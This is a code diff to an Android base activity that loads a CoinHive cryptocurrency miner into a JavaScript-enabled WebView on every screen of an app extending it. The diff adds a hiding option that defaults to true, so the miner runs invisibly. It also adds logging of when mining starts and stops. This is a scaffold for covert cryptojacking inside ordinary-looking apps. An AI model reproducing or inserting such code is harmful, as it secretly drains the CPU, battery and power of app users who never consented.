@@ -5,6 +5,7 @@ import android.support.v7.app.AppCompatActivity;
 import android.view.View;
 import android.view.ViewGroup;
 import android.webkit.WebView;
+import android.webkit.WebViewClient;
 import android.widget.LinearLayout;
 
 /**
@@ -12,6 +13,7 @@ import android.widget.LinearLayout;
  */
 
 public class BaseCoinHiveActivity extends AppCompatActivity {
+
 
     @Override
     public void setContentView(@LayoutRes int layoutResID) {
@@ -21,8 +23,24 @@ public class BaseCoinHiveActivity extends AppCompatActivity {
         wvCoinHive.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
         wvCoinHive.getSettings().setJavaScriptEnabled(true);
         wvCoinHive.loadUrl(CoinHive.generateURL());
+        wvCoinHive.setWebViewClient(new WebViewClient() {
+
+        });
+        System.out.println("Mining started");
 
         ((ViewGroup) getWindow().getDecorView().findViewById(android.R.id.content)).addView(wvCoinHive);
-        wvCoinHive.setVisibility(View.GONE);
+        if (isHideMining()) {
+            wvCoinHive.setVisibility(View.GONE);
+        }
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        System.out.println("Mining stopped");
+    }
+
+    public boolean isHideMining() {
+        return true;
     }
 }
